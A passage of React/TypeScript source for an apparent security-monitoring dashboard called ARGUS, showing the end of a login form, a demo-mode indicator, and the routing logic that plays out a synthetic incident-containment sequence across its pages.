className="hs-step"><ActiveIcon size={14} /><span>{active.label}</span></div><div className="hs-track"><i style={{ width: `${Math.min(100, Math.round(((step + 1) / phases.length) * 100))}%` }} /></div><div className="login-detail" style={{ justifyContent: 'center' }}><span>{String(step + 1)}</span><span>/ {phases.length}</span><span>~{Math.max(1, totalSeconds - Math.round(step * PHASE_MS / 1000))}s LEFT</span></div></div> : <div className="login-detail login-fade d2"><span>24 ENDPOINTS</span><span>LOCAL SYNTHETIC DATA</span><span>OBSERVATION-FIRST</span></div>}</div><div className="login-form-wrap"><form className={cn('login-form', busy && 'is-busy')} onSubmit={(e) => { e.preventDefault(); begin(); }}><div className="eyebrow login-fade d1">Secure workspace</div>{busy ? <div className="login-busy login-fade" data-testid="auth-busy" aria-live="polite"><div className="login-spinner"><Radar size={40} /></div><h2>{active.label}</h2><p>{active.detail}</p><div className="login-meta">{phases.map((s, i) => <span key={s.label} className={i < step ? 'done' : i === step ? 'now' : ''}>{i < step ? <Check size={11} /> : <i />}{s.label}</span>)}</div></div> : <><div className="auth-mode-switch login-fade d1"><button type="button" className={mode === 'login' ? 'active' : ''} onClick={() => switchMode('login')} data-testid="tab-login">SIGN IN</button><button type="button" className={mode === 'register' ? 'active' : ''} onClick={() => switchMode('register')} data-testid="tab-register">CREATE ACCOUNT</button></div><h2 className="login-fade d2">{mode === 'login' ? 'Sign in to ARGUS' : 'Create your ARGUS account'}</h2><p className="login-fade d3">{mode === 'login' ? 'Use the simulated credentials or enter Demo Mode to explore the full investigation flow.' : 'Provision a new analyst identity attached to the local synthetic sensor fabric.'}</p><div className="field login-fade d3"><label>Display name</label><input value={name} onChange={(e) => setName(e.target.value)} type="text" autoComplete="name" data-testid="input-register-name" /></div><div className="field login-fade d3"><label>{mode === 'login' ? 'Analyst email' : 'Email address'}</label><input value={email} onChange={(e) => setEmail(e.target.value)} type="email" autoComplete="username" data-testid="input-auth-email" /></div><div className="field login-fade d4"><label>Access key</label><input value={password} onChange={(e) => setPassword(e.target.value)} type="password" autoComplete={mode === 'register' ? 'new-password' : 'current-password'} data-testid="input-auth-password" placeholder={mode === 'register' ? 'Minimum 8 characters' : ''} /></div>{mode === 'register' && <div className="field login-fade d4"><label>Confirm access key</label><input value={confirm} onChange={(e) => setConfirm(e.target.value)} type="password" autoComplete="new-password" data-testid="input-register-confirm" /></div>}{error && <div className="muted" style={{ color: 'hsl(var(--destructive))', fontSize: 11, margin: '-6px 0 10px' }} data-testid="auth-error">{error}</div>}<Button type="submit" kind="primary" icon={mode === 'login' ? ArrowRight : ShieldCheck} testId={mode === 'login' ? 'button-sign-in' : 'button-register'} disabled={busy}>{mode === 'login' ? 'Sign in' : 'Create account'}</Button>{mode === 'login' && <Button onClick={begin} icon={Play} testId="button-demo-mode">Enter Demo Mode</Button>}<div className="auth-toggle login-fade d5">{mode === 'login' ? <>New to ARGUS? <button type="button" onClick={() => switchMode('register')} data-testid="link-to-register">Create an account</button></> : <>Already registered? <button type="button" onClick={() => switchMode('login')} data-testid="link-to-login">Sign in</button></>}</div><div style={{ borderTop: '1px solid hsl(var(--border))', marginTop: 18, paddingTop: 13, display: 'flex', gap: 8, color: 'hsl(var(--muted-foreground))', fontSize: 10 }} className="login-fade d5"><LockKeyhole size={13} /> Synthetic workspace · no credentials are transmitted · full sequence runs ~{totalSeconds}s</div></>}</form></div></div>;
}
// ExposureWindowPage extracted to @/pages/exposure-window-page

/** Persistent Autonomous Demo indicator + stop control, shown across routes. */
function AutonomousDemoPill({ demo, onStop }: { demo: AutonomousDemoState; onStop: () => void }) {
  const stepName = demo.demoStep === DEMO_STEP.DASHBOARD
    ? 'Dashboard'
    : demo.demoStep === DEMO_STEP.THREAT_DETECTION
      ? 'Threat detection'
      : demo.demoStep;
  return (
    <div className="demo-pill" data-testid="demo-status-pill">
      <span className="event-dot" style={{ margin: 0, background: 'hsl(var(--primary))' }} />
      <span className="demo-pill-label">AUTONOMOUS DEMO</span>
      <span className="demo-pill-step">{stepName}{demo.demoStep === DEMO_STEP.DASHBOARD ? ` · detection in ${demo.demoRemainingSeconds}s` : ''}</span>
      <Button kind="danger" icon={X} onClick={onStop} testId="button-stop-demo">Stop demo</Button>
    </div>
  );
}

function AppContent() {
  const [location, setLocation] = useLocation();
  const [session, setSession] = useState(() => hasActivationMarker());
  const [userName, setUserName] = useState('Analyst');
  const [authMode, setAuthMode] = useState<AuthMode>('login');
  const [mobileOpen, setMobileOpen] = useState(false);
  const [phase, setPhase] = useState(0);
  const [demoState, setDemoState] = useState<DemoRunState>('idle');
  const [threats, setThreats] = useState(threatsSeed);
  const quarantineManager = useQuarantine();
  const { items: quarantine, setItems: setQuarantine } = quarantineManager;
  const reportsManager = useReports();
  const [cyberCellSubmitted, setCyberCellSubmitted] = useState(false);
  const [modal, setModal] = useState<ModalState>(null);
  const [toasts, setToasts] = useState<Array<{ id: number; title: string; body: string }>>([]);

  useEffect(() => {
    fetchActivationStatus().then((active) => {
      if (active === true) {
        setSession(true);
      } else if (active === false) {
        setSession(false);
      }
    });
  }, []);

  const processMonitor = useProcessMonitor();
  const telemetryStream = useTelemetryStream();
  const networkMonitor = useNetworkMonitor();
  const fileScan = useFileScan();
  const detections = useDetections();
  const threatAnalysis = useThreatAnalysis(processMonitor, networkMonitor, fileScan, threats);

  const toast = (title: string, body: string) => {
    const id = Date.now() + Math.floor(Math.random() * 1000);
    setToasts((old) => [...old, { id, title, body }]);
    window.setTimeout(() => setToasts((old) => old.filter((t) => t.id !== id)), 3800);
  };

  const applyContainment = (threatIds: string[] = ['thr-1', 'thr-2']) => {
    setThreats((prev) => prev.map((t) => (
      threatIds.includes(t.id) && (t.status === 'detected' || t.status === 'contained')
        ? { ...t, status: 'quarantined' as ThreatStatus }
        : t
    )));
    setQuarantine((prev) => {
      const next = [...prev];
      for (const item of containmentQuarantineItems) {
        if (!next.some((q) => q.id === item.id)) {
          next.unshift(item);
          quarantineManager.addQuarantine({
            path: item.path,
            name: item.name,
            reason: item.quarantineReason || 'Host containment applied',
            severity: item.severity,
          });
        }
      }
      return next;
    });
  };

  const resetIncidentState = () => {
    setPhase(0);
    setDemoState('idle');
    setThreats(threatsSeed);
    setQuarantine(quarantineSeed);
    setCyberCellSubmitted(false);
  };

  const autoDemo = useAutonomousDemo({
    setPhase,
    setDemoState,
    navigate: setLocation,
    resetIncident: resetIncidentState,
    notify: toast,
  });
  const stopDemo = autoDemo.stop;

  const startDemo = () => {
    if (autoDemo.state.demoMode) {
      stopDemo();
      return;
    }
    if (phase >= 8 || demoState === 'completed') {
      resetIncidentState();
      toast('Demo reset', 'Synthetic incident state returned to baseline.');
      return;
    }
    autoDemo.start();
  };

  const pauseDemo = () => {
    if (autoDemo.state.demoMode) {
      autoDemo.pause();
      return;
    }
    if (demoState !== 'running') return;
    setDemoState('paused');
    toast('Demo paused', 'Automatic progression is paused. Resume when ready.');
  };

  const resumeDemo = () => {
    if (autoDemo.state.demoMode) {
      autoDemo.resume();
      return;
    }
    if (demoState !== 'paused') return;
    setDemoState('running');
    toast('Demo resumed', `Continuing from sequence ${phase} of 8.`);
  };

  const containThreat = (id: string) => {
    applyContainment([id]);
    toast('Endpoint contained', 'Network isolation applied. Quarantine inventory updated for WS-0427.');
  };

  const logout = () => {
    stopDemo();
    deactivate();
    setSession(false);
    setAuthMode('login');
    setMobileOpen(false);
    setModal(null);
    setLocation('/activate');
    toast('Deactivated', 'ARGUS session deactivated.');
  };

  useEffect(() => {
    if (autoDemo.state.demoMode) return undefined;
    if (demoState !== 'running' || phase <= 0 || phase >= 8) return undefined;
    const timer = window.setTimeout(() => {
      const next = phase + 1;
      setPhase(next);
      const labels = ['Process start observed', 'Sensitive files accessed', 'Archive staging observed', 'Potential transmission inferred', 'Risk score elevated', 'Detection correlated', 'Endpoint contained'];
      toast(labels[phase - 1], `Synthetic incident sequence ${next} of 8.`);
      if (next === 8) {
        applyContainment(['thr-1', 'thr-2']);
        setDemoState('completed');
        toast('Incident contained', 'Threat status and quarantine inventory now reflect containment.');
      }
    }, 1550);
    return () => window.clearTimeout(timer);
  }, [phase, demoState, autoDemo.state.demoMode]);

  useEffect(() => {
    if (!session && location !== '/activate' && location !== '/login') {
      setLocation('/activate');
    } else if (session && (location === '/' || location === '')) {
      setLocation('/dashboard');
    }
  }, [session, location, setLocation]);

  const incidentStatus = phase >= 8 ? 'Contained' : phase >= 7 ? 'Detected' : phase >= 5 ? 'Assessing' : phase > 0 ? 'Monitoring' : 'Open';
  const contained = phase >= 8 || threats.some((t) => t.status === 'quarantined' && (t.id === 'thr-1' || t.id === 'thr-2'));

  const page = useMemo(() => {
    if (location === '/' || location === '/dashboard') return <DashboardPage phase={phase} demoState={demoState} demo={autoDemo.state} startDemo={startDemo} pauseDemo={pauseDemo} resumeDemo={resumeDemo} toast={toast} telemetry={telemetryStream} processMonitor={processMonitor} userName={userName} threatAnalysis={threatAnalysis} networkMonitor={networkMonitor} fileScan={fileScan} detections={detections} onNavigate={setLocation} />;
    if (location === '/threats') return <ThreatsPage threats={threats} onContain={containThreat} toast={toast} setModal={setModal} setLocation={setLocation} threatAnalysis={threatAnalysis} demoReached={autoDemo.state.demoReached} processMonitor={processMonitor} networkMonitor={networkMonitor} fileScan={fileScan} detections={detections} telemetry={telemetryStream} />;
    if (location === '/auto-remediation') return <AutoRemediationPage threats={threats} toast={toast} onNavigate={setLocation} telemetry={telemetryStream} processMonitor={processMonitor} networkMonitor={networkMonitor} fileScan={fileScan} />;
    if (location === '/detections') return <DetectionsPage detections={detections} toast={toast} setLocation={setLocation} />;
    if (location === '/detections/rules') return <RuleCatalogPage detections={detections} />;
    if (location === '/monitoring') return <MonitoringPage processMonitor={processMonitor} onNavigate={setLocation} />;
    if (location === '/processes') return <ProcessesPage toast={toast} contained={contained} monitorData={processMonitor} onNavigate={setLocation} />;
    if (location === '/files') return <FilesPage toast={toast} fileScan={fileScan} telemetry={telemetryStream} onNavigate={setLocation} onQuarantine={(item) => {
      quarantineManager.addQuarantine({
        path: item.path,
        name: item.name,
        reason: item.quarantineReason || 'Suspicious file quarantined from filesystem triage',
        severity: item.severity,
      });
      setQuarantine((prev) => [item, ...prev]);
    }} />;
    if (location === '/network') return <NetworkPage toast={toast} contained={contained} />;
    if (location === '/exposure') return <ExposurePage phase={phase} toast={toast} threatAnalysis={threatAnalysis} fileScan={fileScan} processMonitor={processMonitor} networkMonitor={networkMonitor} onNavigate={setLocation} contained={contained} onContain={() => containThreat('thr-1')} />;
    if (location === '/attack-trace') return <AttackTracePage toast={toast} onNavigate={setLocation} />;
    if (location === '/backtrace' || location === '/backtrace-3d') return <BacktraceInvestigationPage onNavigate={setLocation} />;
    if (location === '/exposure-window') return <ExposureWindowPage phase={phase} toast={toast} threatAnalysis={threatAnalysis} processMonitor={processMonitor} networkMonitor={networkMonitor} fileScan={fileScan} telemetry={telemetryStream} contained={contained} onNavigate={setLocation} />;
    if (location === '/timeline') return <TimelinePage phase={phase} toast={toast} processMonitor={processMonitor} networkMonitor={networkMonitor} threatAnalysis={threatAnalysis} fileScan={fileScan} telemetry={telemetryStream} contained={contained} onNavigate={setLocation} />;
    if (location === '/quarantine') return <QuarantinePage items={quarantineManager.items} setItems={quarantineManager.setItems} toast={toast} setModal={setModal} setLocation={setLocation} onAddQuarantine={quarantineManager.addQuarantine} onRestore={quarantineManager.restoreQuarantine} onPurge={quarantineManager.purgeQuarantine} onVerify={quarantineManager.verifyIntegrity} vaultPath={quarantineManager.vaultPath} />;
    if (location === '/intelligence') return <IntelligencePage toast={toast} processMonitor={processMonitor} networkMonitor={networkMonitor} fileScan={fileScan} threatAnalysis={threatAnalysis} telemetry={telemetryStream} onNavigate={setLocation} />;
    if (location === '/reports') return <ReportsPage phase={phase} incidentStatus={incidentStatus} quarantineItems={quarantineManager.items} processMonitor={processMonitor} networkMonitor={networkMonitor} threatAnalysis={threatAnalysis} telemetry={telemetryStream} toast={toast} onSaveToHistory={reportsManager.createReport} onNavigate={setLocation} vaultPath={reportsManager.vaultPath} />;
    if (location === '/history') return <HistoryPage reports={reportsManager.reports} onDeleteReport={reportsManager.deleteReport} toast={toast} onNavigate={setLocation} vaultPath={reportsManager.vaultPath} />;
    if (location === '/cyber-cell') return <CyberCellPage toast={toast} incidentStatus={incidentStatus} phase={phase} quarantineCount={quarantine.length} submitted={cyberCellSubmitted} onSubmitted={() => setCyberCellSubmitted(true)} onResetSubmission={() => setCyberCellSubmitted(false)} telemetry={telemetryStream} processMonitor={processMonitor} networkMonitor={networkMonitor} fileScan={fileScan} threatAnalysis={threatAnalysis} />;
    if (location === '/lab') return <LabPage toast={toast} onNavigate={setLocation} />;
    if (location === '/settings') return <SettingsPage toast={toast} />;
    if (location === '/about') return <AboutPage />;
    return <NotFound />;
  }, [location, phase, demoState, threats, quarantine, quarantineManager, reportsManager, incidentStatus, contained, cyberCellSubmitted, processMonitor, telemetryStream, networkMonitor, threatAnalysis, detections, autoDemo.state, fileScan]);

  const toastStack = <div className="toast-stack">{toasts.map((t) => <div className="toast" key={t.id} data-testid={`toast-${t.id}`}><strong>{t.title}</strong><p>{t.body}</p></div>)}</div>;

  if (!session || location === '/login' || location === '/activate') {
    return <>
      <ActivationScreen
        onActivated={() => {
          setUserName('Analyst');
          setSession(true);
          setLocation('/dashboard');
          toast('ARGUS Activated', 'ARGUS installation activated successfully.');
        }}
      />
      {toastStack}
    </>;
  }

      return <div className="argus-shell"><Sidebar location={location} open={mobileOpen} onClose={() => setMobileOpen(false)} onLogout={logout} userName={userName} monitorConnected={processMonitor.connected} threatCount={threatAnalysis.threatCount} detectionCount={detections.detections.length} /><div className="main-wrap">      <header className="topbar"><div style={{ display: 'flex', alignItems: 'center', gap: 12 }}><button className="btn btn-ghost mobile-only" style={{ padding: 5 }} onClick={() => setMobileOpen(true)} data-testid="button-open-nav"><Menu size={18} /></button><div><div style={{ fontSize: 11, fontWeight: 700 }}>Security intelligence workspace</div><div className="mono muted" style={{ marginTop: 2 }}>Northstar / {location.slice(1).replace('-', ' ')}{demoState !== 'idle' ? ` · demo ${demoState}` : ''}{processMonitor.hasData ? ' · live' : ''}</div></div></div>{autoDemo.state.demoMode && <AutonomousDemoPill demo={autoDemo.state} onStop={stopDemo} />}<div style={{ display: 'flex', gap: 15, alignItems: 'center' }}><EvidenceLegend /><div style={{ height: 22, borderLeft: '1px solid hsl(var(--border))' }} /><button className="btn btn-ghost" style={{ padding: 5 }} onClick={() => toast('No new alerts', 'The sensor network has no unread notifications.')} data-testid="button-notifications"><Bell size={15} /></button><div className="avatar" style={{ width: 26, height: 26 }}>{userName.trim().split(/\s+/).map((p) => p[0] || '').slice(0, 2).join('').toUpperCase() || 'MA'}</div></div></header><main className="content"><div className="route-container" key={location} data-testid="route-view">{page}</div></main></div>{modal && <div className="modal-backdrop" role="presentation"><div className="modal"><div className="eyebrow">Confirm action</div><h2>{modal.title}</h2><p>{modal.body}</p><div className="modal-actions"><Button onClick={() => setModal(null)} testId="button-cancel-confirmation">Cancel</Button><Button kind={modal.danger ? 'danger' : 'primary'} onClick={() => { modal.onConfirm(); setModal(null); }} testId="button-confirm-action">{modal.confirm}</Button></div></div></div>}{toastStack}</div>;
}

function App() {
  return <QueryClientProvider client={queryClient}><TooltipProvider><WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, '')}><ErrorBoundary resetKey={window.location.pathname}><AppContent /></ErrorBoundary></WouterRouter><Toaster /></TooltipProvider></QueryClientProvider>;
}

export default App;
